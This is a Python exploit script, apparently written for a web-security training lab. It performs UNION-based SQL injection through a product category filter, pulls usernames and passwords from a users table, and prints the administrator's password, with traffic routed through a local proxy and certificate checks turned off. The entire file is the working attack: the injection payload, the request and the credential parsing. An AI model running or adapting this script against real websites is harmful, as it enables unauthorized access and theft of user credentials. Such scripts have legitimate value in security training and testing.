import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re # to perform regex 
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli(url):
    path= "/filter?category="
    payload = "Corporate+gifts'+UNION+SELECT+NULL,CONCAT(username,'+*+',password)+FROM+users+--"
    response = requests.get(url+path+payload,verify=False,proxies=proxies)
    result_tex = response.text
    if "administrator" in result_tex:

        print("(+) Found the administrator pasword...")

        soup = BeautifulSoup(result_tex,"html.parser")

        admin_password = soup.find(string=re.compile('.*administrator.*')).split("*")[1]

        print(f"(+) Administrator pasword = '{admin_password}'")

        return True
    else:
        return False
    


if __name__ == "__main__":
    try:
        url = sys.argv[1]
        if exploit_sqli(url):
            print("(+) Exploitation done sucessfully")
        else:
            print("(-) Something wen wrong")
    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)